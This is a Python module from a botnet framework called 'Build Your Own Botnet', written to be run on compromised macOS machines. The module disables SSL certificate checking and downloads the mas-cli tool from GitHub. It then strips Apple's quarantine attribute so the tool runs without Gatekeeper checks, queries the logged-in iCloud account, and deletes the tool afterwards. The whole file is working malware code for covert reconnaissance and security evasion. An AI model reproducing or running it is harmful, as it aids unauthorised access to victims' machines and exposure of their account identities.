#!/usr/bin/python
# -*- coding: utf-8 -*-
'iCloud (Build Your Own Botnet)'

# standard library
import os
import sys
import ssl
import subprocess

if sys.version_info[0] < 3:
    from urllib import urlretrieve
else:
    from urllib.request import urlretrieve

# utilities
import util

# globals
packages = []
platforms = ['darwin']
command = True
usage = 'icloud'
description = """
Check for logged in iCloud accounts on macOS
"""

# create default ssl context (workaround for python3 compatibility)
ssl._create_default_https_context = ssl._create_unverified_context


def run():
    """
    Check for logged in iCloud account on macOS
    """
    try:
        filename, _ = urlretrieve("https://github.com/mas-cli/mas/releases/download/v1.4.2/mas-cli.zip")
        util.unzip(filename)
        mas = os.path.join(os.path.dirname(filename), 'mas')
        subprocess.Popen(['xattr','-r','-d','com.apple.quarantine',mas], 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE)
        os.chmod(mas, 755)
        result = subprocess.check_output([mas, "account"]).rstrip()
        util.delete(mas)
        return result
    except Exception as e:
        return "{} error: {}".format(__name__, str(e))
